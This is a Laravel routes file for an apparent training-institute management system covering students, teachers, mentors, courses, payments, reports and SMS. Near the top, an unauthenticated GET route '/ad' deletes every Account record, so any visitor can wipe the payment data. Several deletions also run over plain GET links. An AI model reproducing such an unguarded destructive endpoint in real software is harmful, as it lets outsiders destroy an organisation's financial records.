<?php


Auth::routes();

Route::get('/pdf', function () {
    $pdf = PDF::loadView('utility.cv2');
    return $pdf->stream('utility.cv2');
});

Route::get('/ad', function () {
    \App\Models\Account::query()->delete();
});

Route::group(['middleware' => 'auth'], function () {

    Route::get('/', 'HomeController@index')->name('home');

    Route::get('/logout', 'Auth\LoginController@logout')->name('logout');

    Route::group(['middleware' => 'admin'], function () {
        Route::get('/users', 'UserController@index')->name('users');
        Route::post('/user/store', 'UserController@store')->name('user.store');
        Route::get('/user/{uid}/edit', 'UserController@edit')->name('user.edit');
        Route::post('/user/update', 'UserController@update')->name('user.update');
        Route::get('/user/{uid}/delete', 'UserController@destroy')->name('user.destroy');

        Route::get('/institutes', 'InstituteController@index')->name('institutes');
        Route::get('/institute/create', 'InstituteController@create')->name('institute.create');
        Route::post('/institute/store', 'InstituteController@store')->name('institute.store');
        Route::get('/institute/{iid}/show', 'InstituteController@show')->name('institute.show');
        Route::get('/institute/{iid}/edit', 'InstituteController@edit')->name('institute.edit');
        Route::post('/institute/update', 'InstituteController@update')->name('institute.update');
        Route::get('/institute/{iid}/delete', 'InstituteController@destroy')->name('institute.delete');

        Route::get('/teachers/find', 'TeacherController@index')->name('teachers.find');
        Route::post('/teachers/find', 'TeacherController@findTeachers');
        Route::get('/teachers/{iid}/found', 'TeacherController@get_teachers')->name('teachers.found');
        Route::get('/teacher/create', 'TeacherController@create')->name('teacher.create');
        Route::post('/teacher/store', 'TeacherController@store')->name('teacher.store');
        Route::get('/teacher/{tid}/edit', 'TeacherController@edit')->name('teacher.edit');
        Route::post('/teacher/update', 'TeacherController@update')->name('teacher.update');
        Route::get('/teacher/{tid}/delete', 'TeacherController@destroy')->name('teacher.delete');
        Route::get('/teacher/{tid}/show', 'TeacherController@show')->name('teacher.show');

        Route::get('/teacher/payment-setup/{year?}', 'TeacherController@teacher_payment_setup_index')->name('teacher.payment.setup.index');
        Route::get('/teacher/payment/setup', 'TeacherController@teacher_payment_setup')->name('teacher.payment.setup');
        Route::post('/teacher/payment/setup/process', 'TeacherController@teacher_payment_setup_process')->name('teacher.payment.setup.process');
        Route::get('/teacher/payment/setup/{tpiid}/edit', 'TeacherController@teacher_payment_setup_edit')->name('teacher.payment.setup.edit');
        Route::post('/teacher/payment/setup/update', 'TeacherController@teacher_payment_setup_update')->name('teacher.payment.setup.update');
        Route::post('/teacher/payment/setup/delete', 'TeacherController@teacher_payment_setup_destroy')->name('teacher.payment.setup.delete');

        Route::get('/teacher/payment/institute', 'TeacherPaymentController@index')->name('teacher.payment.institute');
        Route::post('/teacher/payment/institute/find', 'TeacherPaymentController@institute_find')->name('teacher.payment.institute.find');
        Route::get('/teacher/payment/{iid}/{year}', 'TeacherPaymentController@institute_payment')->name('teacher.payment');
        Route::post('/teacher/payment/process', 'TeacherPaymentController@teacher_payment')->name('teacher.payment.process');

        Route::get('/teacher/payment/history', 'TeacherPaymentController@teacher_payment_history')->name('teacher.payment.history');

        Route::get('institute/{iid}/teacher/payment/years', 'TeacherPaymentController@teacher_payment_years')->name('teacher.payment.years');

        Route::get('/sectors', 'CourseTypeController@index')->name('course_types');
        Route::get('/sector/create', 'CourseTypeController@create')->name('course_type.create');
        Route::post('/sector/store', 'CourseTypeController@store')->name('course_type.store');
        Route::get('/sector/{ctid}/edit', 'CourseTypeController@edit')->name('course_type.edit');
        Route::post('/sector/update', 'CourseTypeController@update')->name('course_type.update');
        Route::get('/sector/{ctid}/delete', 'CourseTypeController@destroy')->name('course_type.delete');

        Route::get('/courses', 'CourseController@index')->name('courses');
        Route::get('/course/create', 'CourseController@create')->name('course.create');
        Route::post('/course/store', 'CourseController@store')->name('course.store');
        Route::get('/course/{cid}/show', 'CourseController@show')->name('course.show');
        Route::get('/course/{cid}/edit', 'CourseController@edit')->name('course.edit');
        Route::post('/course/update', 'CourseController@update')->name('course.update');
        Route::get('/course/{cid}/delete', 'CourseController@destroy')->name('course.delete');

        // AJAX Request
        Route::get('/courses/{type}', 'CourseController@courseByType')->name('courses.type');
        Route::get('/course/{cid}/batches', 'CourseController@getBatchesByCourse')->name('course.batches');
        Route::get('/course/{cid}/{year}/batch-name', 'CourseController@createBatchName')->name('course.batch.create');

        Route::get('/batches', 'BatchController@index')->name('batches');
        Route::get('/batch/create', 'BatchController@create')->name('batch.create');
        Route::post('/batch/store', 'BatchController@store')->name('batch.store');
        Route::get('/batch/{bid}/edit', 'BatchController@edit')->name('batch.edit');
        Route::post('/batch/update', 'BatchController@update')->name('batch.update');
        Route::get('/batch/{bid}/delete', 'BatchController@destroy')->name('batch.delete');

        Route::get('/mentors', 'MentorController@index')->name('mentors');
        Route::get('/mentor/create', 'MentorController@create')->name('mentor.create');
        Route::post('/mentor/store', 'MentorController@store')->name('mentor.store');
        Route::get('/mentor/{mid}/show', 'MentorController@show')->name('mentor.show');
        Route::get('/mentor/{mid}/edit', 'MentorController@edit')->name('mentor.edit');
        Route::get('/mentor/{mid}/delete', 'MentorController@destroy')->name('mentor.delete');

        Route::get('/mentor/{mid}/career-objective/create', 'MentorController@career_objective')->name('mentor.career-objective');
        Route::post('/mentor/career-objective/store', 'MentorController@career_objective_store')->name('mentor.career-objective.store');
        Route::get('/mentor/{mid}/academic-q/create', 'MentorController@academic_qualification')->name('mentor.academic-qualification');
        Route::post('/mentor/academic-q/store', 'MentorController@academic_q_store')->name('mentor.academic-q-store.store');
        Route::get('/mentor/{mid}/specialization/create', 'MentorController@create_specialization')->name('mentor.specialization.create');
        Route::post('/mentor/specialization/store', 'MentorController@specialization_store')->name('mentor.specialization.store');
        Route::get('/mentor/{mid}/employment-h/create', 'MentorController@create_employment_h')->name('mentor.employment-history.create');
        Route::post('/mentor/employment-h/store', 'MentorController@employment_history_store')->name('mentor.employment-history.store');
        Route::get('/mentor/{mid}/personal-info/edit', 'MentorController@edit_personal_info')->name('mentor.personal-info.edit');
        Route::post('/mentor/personal-info/update', 'MentorController@update_personal_info')->name('mentor.personal-info.update');
        Route::get('/mentor/{mid}/career-objective/edit', 'MentorController@edit_career_objective')->name('mentor.career-objective.edit');
        Route::post('/mentor/career-objective/update', 'MentorController@update_career_objective')->name('mentor.career-objective.update');
        Route::get('/mentor/{mid}/employment-history/edit', 'MentorController@edit_employment_history')->name('mentor.employment-history.edit');
        Route::post('/mentor/employment-history/update', 'MentorController@update_employment_history')->name('mentor.employment-history.update');
        Route::get('/mentor/employment-history/{eid}/delete', 'MentorController@delete_employment_history')->name('mentor.employment-history.delete');
        Route::get('/mentor/{mid}/academic-q/edit', 'MentorController@edit_academic_qualification')->name('mentor.academic-qualification.edit');
        Route::post('/mentor/academic-q/update', 'MentorController@update_academic_qualification')->name('mentor.academic-qualification.update');
        Route::get('/mentor/academic-q/{aid}/delete', 'MentorController@delete_academic_qualification')->name('mentor.academic-qualification.delete');
        Route::get('/mentor/{mid}/specialization/edit', 'MentorController@edit_specialization')->name('mentor.specialization.edit');
        Route::post('/mentor/specialization/update', 'MentorController@update_specialization')->name('mentor.specialization.update');
        Route::get('/mentor/specialization/{sid}/delete', 'MentorController@delete_specialization')->name('mentor.specialization.delete');

        Route::get('/mentor/{mid}/setup-payments', 'MentorController@mentor_payment_setup_index')->name('mentor.setup-payments');
        Route::get('/mentor/{mid}/payment/setup', 'MentorController@mentor_payment_setup')->name('mentor.payment.setup');
        Route::post('/mentor/payment-setup', 'MentorController@mentor_payment_setup_process')->name('mentor.payment-setup.process');
        Route::get('/mentor/payment/setup/{mpiid}/edit', 'MentorController@mentor_payment_setup_edit')->name('mentor.payment-setup.edit');
        Route::post('/mentor/payment-setup/update', 'MentorController@mentor_payment_setup_update')->name('mentor.payment-setup.update');
        Route::post('/mentor/payment-setup/delete', 'MentorController@mentor_payment_setup_delete')->name('mentor.payment-setup.delete');

        Route::get('/mentor/payment', 'MentorPaymentController@index')->name('mentor.payment.mentor-search');
        Route::post('/mentor/payment/mentor-search', 'MentorPaymentController@mentor_search')->name('mentor.payment.mentor-search.process');
        Route::get('/mentor/payment/{mid}/info', 'MentorPaymentController@mentor_payment_info')->name('mentor.payment.info');
        Route::get('/mentor/payment/{mpiid}/p', 'MentorPaymentController@mentor_payment')->name('mentor.payment.p');
        Route::post('/mentor/payment/receive', 'MentorPaymentController@mentor_payment_receive')->name('mentor.payment.receive');

        Route::get('/mentor/batch-setup', 'MentorController@batch_setup_index')->name('mentor.batch-setup.index');
        Route::get('/mentor/{mid}/batch/setup', 'MentorController@batch_setup')->name('mentor.batch.setup');
        Route::post('/mentor/batch/setup/process', 'MentorController@batch_setup_process')->name('mentor.batch-setup.process');

        Route::get('/mentor/payment/history', 'MentorPaymentController@mentor_payment_history')->name('mentor.payment.history');

        Route::get('/mentor/{mid}/course/{cid}/batches', 'MentorController@mentor_batches_by_course')->name('mentor.course.batches');

        Route::get('/report', 'ReportController@index')->name('report.index');
        Route::post('/report/students/search', 'ReportController@studentsReport')->name('report.students.search');
        Route::get('/report/batch/{bid}/students', 'ReportController@studentsByBatch')->name('report.students.batch');
        Route::get('/report/course/{cid}/students', 'ReportController@studentsByCourse')->name('report.students.course');
        Route::get('/report/type/{ct}/students', 'ReportController@studentByCourseType')->name('report.students.course-type');
        Route::post('/report/payment/status/search', 'ReportController@paymentStatusSearch')->name('report.payment.status.search');
        Route::get('/report/due/{ct}/students', 'ReportController@duePaymentStudents')->name('report.due.students');
        Route::get('/report/paid/{ct}/students', 'ReportController@paidPaymentStudents')->name('report.paid.students');
        Route::get('/report/students', 'ReportController@allStudents')->name('report.students.all');
        Route::post('/report/division/institute/find', 'ReportController@divisionInstituteStudents')->name('report.division.institute.find');
        Route::get('/report/institute/{iid}/students', 'ReportController@studentsByInstitute')->name('report.institute.students');
        Route::get('/report/institute/{iid}/students/due', 'ReportController@studentsByInstituteDue')->name('report.institute.students.due');
        Route::get('/report/division/{division}/students', 'ReportController@studentsByDivision')->name('report.division.students');

        Route::get('/transaction', 'ReportController@transaction')->name('transaction');
        Route::post('/transaction/find', 'ReportController@transaction_find')->name('transaction.find');
//        Route::get('/transaction/{from_date}/{to_date}/found', 'ReportController@transaction_show')->name('transaction.show');
        Route::get('/transaction/{uid}/{from_date}/{to_date}/{type}/show', 'ReportController@user_transaction_show')->name('transaction.user.show');

        Route::get('/student/{sid}/course/{bid}/migration', 'StudentController@student_course_migration')->name('student.course.migration');
        Route::post('/student/course/migrate', 'StudentController@student_course_migrate')->name('student.course.migrate');
        Route::get('/student/{sid}/course/{cid}/previous', 'StudentController@migrated_previous_course')->name('student.course.previous');

        Route::get('/students/installment-dates/today', 'ReportController@today_installment_dates')->name('installment_dates.today');
        Route::post('/students/installment/message', 'AccountController@installment_message_send')->name('student.installment.message');

    });

    Route::get('/students/{students_type}/{year?}', 'StudentController@index')->name('students');

    Route::prefix('student')->name('student.')->group(function () {


        Route::get('/create', 'StudentController@create')->name('create');
        Route::post('/store', 'StudentController@store')->name('store');
        Route::get('/{sid}/show', 'StudentController@show')->name('show');
        Route::get('/{sid}/edit', 'StudentController@edit')->name('edit');
        Route::post('/update', 'StudentController@update')->name('update');
        Route::get('/{sid}/delete', 'StudentController@destroy')->name('delete');

        Route::get('/{student_as}/{year}/new-reg-number', 'StudentController@new_reg_number')->name('new.reg.number');

        Route::get('/search', 'StudentController@search_student')->name('search');
        Route::post('/search/process', 'StudentController@student_search_process')->name('search.process');
        Route::get('/{sid}/course/assign', 'StudentController@new_course_assign')->name('course.assign');
        Route::post('/course/assign/process', 'StudentController@student_course_add')->name('course.add');

        Route::get('/{sid}/registration-form', 'StudentController@registration_form')->name('registration-form');

    });

    Route::get('/account', 'AccountController@index')->name('account');
    Route::post('/account/search', 'AccountController@accountSearch')->name('account.search');
    Route::get('/account/student/{sid}/courses', 'AccountController@studentCourses')->name('account.student.courses');
    Route::get('/account/student/{sid}/{cid}/payment', 'PaymentController@payment')->name('account.payment');
    Route::get('/account/{sid}/{cid}/payment/new', 'PaymentController@newPaymentForm')->name('account.payment.new');
    Route::get('/account/{sid}/{cid}/payment/exist', 'PaymentController@existPaymentForm')->name('account.payment.exist');
    Route::post('/account/payment/new/receive', 'PaymentController@newPaymentReceive')->name('payment.new.receive');
    Route::post('/account/payment/installment', 'PaymentController@installmentReceive')->name('payment.installment');
    Route::get('/account/payment/{aid}/receipt', 'PaymentController@paymentReceipt')->name('payment.receipt');
    Route::get('/student/{sid}/payment/history', 'PaymentController@studentPaymentHistory')->name('student.payment.history');
    Route::post('/account/payment/anytime-discount/{aid}', 'PaymentController@anytimeDiscount')->name('anytime.discount');

    Route::get('/daily-report', 'DailyreportController@index')->name('daily.report');
    Route::get('/daily-report/ajax', 'DailyreportController@drajax');

    Route::get('/change-course-batch/{sid}/{cid}/{bid}', 'ChangecoursebatchController@index')->name('change.course.view');
    Route::get('/ajax/change/course', 'ChangecoursebatchController@ajaxCall');
    Route::post('/change-course-batch/{sid}/{cid}/{bid}', 'ChangecoursebatchController@change')->name('change.course');

    Route::get('/birthday', 'DailyreportController@birthday')->name('birthday');
    Route::post('/sms-student-birthday', 'DailyreportController@birthdaySms')->name('sms.student.birthday');
    Route::post('/birthday', 'DailyreportController@birthdayP')->name('birthday.p');
    Route::get('/birthday/{days}', 'DailyreportController@birthdayPD')->name('birthday.p.dummy');

    Route::post('/sms-student-batch/{bid}', 'ReportController@smsStudentBatch')->name('sms.student.batch');

    Route::get('/marketing/default-list', 'MarketingController@index')->name('marketing.list');
    Route::get('/marketing/admitted-list', 'MarketingController@admittedList')->name('marketing.admitted.list');
    Route::get('/marketing/not-interested-list', 'MarketingController@notInterestedList')->name('marketing.not.interested.list');
    Route::get('/marketing/add', 'MarketingController@create')->name('marketing.add');
    Route::get('/marketing/delete/{mid}', 'MarketingController@destroy')->name('marketing.delete');
    Route::get('/marketing/admitted/{mid}', 'MarketingController@admitted')->name('marketing.admitted');
    Route::get('/marketing/not-interested/{mid}', 'MarketingController@notInterested')->name('marketing.notInterested');
    Route::get('/marketing/interested/{mid}', 'MarketingController@interested')->name('marketing.interested');
    Route::post('/marketing/add', 'MarketingController@store')->name('marketing.store');
    Route::post('/marketing-comment/add/{mid}', 'MarketingController@storeComment')->name('marketing.comment.store');
    Route::post('/marketing-default/search', 'MarketingController@defaultSearch')->name('marketing.default.search');
    Route::post('/marketing-not-interested/search', 'MarketingController@notInterestedSearch')->name('marketing.notInterested.search');
    Route::post('/marketing-admitted/search', 'MarketingController@admittedSearch')->name('marketing.admitted.search');
    Route::get('/marketing/today-conversation-list', 'MarketingController@today')->name('marketing.list.today');
    
    Route::post('/sms-student-institute/{iid}', 'ReportController@instituteSms')->name('sms.student.institute');
    Route::post('/sms-student-institute/{iid}/due', 'ReportController@instituteSmsDue')->name('sms.student.institute.due');


});
